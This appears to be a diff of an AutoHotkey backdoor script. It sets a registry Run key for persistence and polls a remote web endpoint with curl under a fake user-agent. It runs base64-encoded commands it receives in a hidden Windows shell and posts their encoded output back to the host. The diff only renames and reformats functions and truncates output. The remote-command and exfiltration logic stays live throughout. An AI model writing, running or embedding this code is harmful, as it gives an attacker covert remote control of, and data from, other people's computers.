@@ -26,57 +26,57 @@ RegWrite,REG_SZ,%runkey%,%mru2%,\1
 
 U(c,f)
 {
-text := BE(c)
-RunWait,curl -s %f% "-Huser-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)AppleWebKit" "-dinitHashContent=................................................................................................................................2&currentHashContent=................................................................................................................................2&encryptedContent=%text%&action=save",,Hide
+RunWait,curl -s %f% "-Huser-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)AppleWebKit" "-dinitHashContent=................................................................................................................................2&currentHashContent=................................................................................................................................2&encryptedContent=%c%&action=save",,Hide
 Return
 }
 
 D(f)
 {
-Return RunWaitOne("for /f tokens^=3^ delims^=^"" `%G in ('curl -s """ . f . "?action=json"" ""-Huser-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)AppleWebKit""')do @echo(`%G")
+Return R("for /f tokens^=3^ delims^=^"" `%G in ('curl -s """ . f . "?action=json"" ""-Huser-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)AppleWebKit""')do @echo(`%G")
 }
 
 BE(string)
 {
-    VarSetCapacity(bin, StrPut(string, "UTF-8")) && len := StrPut(string, &bin, "UTF-8") - 1
-    if !(DllCall("crypt32\CryptBinaryToString", "ptr", &bin, "uint", len, "uint", 0x40000001, "ptr", 0, "uint*", size))
-        return
-    VarSetCapacity(buf, size << 1, 0)
-    if !(DllCall("crypt32\CryptBinaryToString", "ptr", &bin, "uint", len, "uint", 0x40000001, "ptr", &buf, "uint*", size))
-        return
-    return StrGet(&buf)
+VarSetCapacity(bin, StrPut(string, "UTF-8")) && len := StrPut(string, &bin, "UTF-8") - 1
+If !(DllCall("crypt32\CryptBinaryToString", "ptr", &bin, "uint", len, "uint", 0x40000001, "ptr", 0, "uint*", size))
+Return
+VarSetCapacity(buf, size << 1, 0)
+If !(DllCall("crypt32\CryptBinaryToString", "ptr", &bin, "uint", len, "uint", 0x40000001, "ptr", &buf, "uint*", size))
+Return
+Return StrGet(&buf)
 }
 
 BD(string)
 {
-    if !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", size, "ptr", 0, "ptr", 0))
-        return
-    VarSetCapacity(buf, size, 0)
-    if !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", &buf, "uint*", size, "ptr", 0, "ptr", 0))
-        return
-    return StrGet(&buf, size, "UTF-8")
+If !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", size, "ptr", 0, "ptr", 0))
+Return
+VarSetCapacity(buf, size, 0)
+If !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", &buf, "uint*", size, "ptr", 0, "ptr", 0))
+Return
+Return StrGet(&buf, size, "UTF-8")
 }
 
-RunWaitOne(c) {
-    DetectHiddenWindows On
-    Run %ComSpec%,, Hide, pid
-    WinWait ahk_pid %pid%
-    DllCall("AttachConsole", "UInt", pid)
+R(c)
+{
+DetectHiddenWindows On
+Run %ComSpec%,, Hide, pid
+WinWait ahk_pid %pid%
+DllCall("AttachConsole", "UInt", pid)
 
-    shell := ComObjCreate("WScript.Shell")
-    exec := shell.Exec(ComSpec " /C " c)
-    result := exec.StdOut.ReadAll()
+shell := ComObjCreate("WScript.Shell")
+exec := shell.Exec(ComSpec " /C " c)
+result := exec.StdOut.ReadAll()
 
-    DllCall("FreeConsole")
-    Process, Close, %pid%
-    return result
+DllCall("FreeConsole")
+Process, Close, %pid%
+return result
 }
 
 Loop
 {
 out := D(focusing)
 If InStr(out, "@")
-U(RunWaitOne(BD(SubStr(out,2))),focusing)
+U(BE(SubStr(R(BD(SubStr(out,2))),1,11900)),focusing)
 Else
 Sleep 500
 Sleep 30000
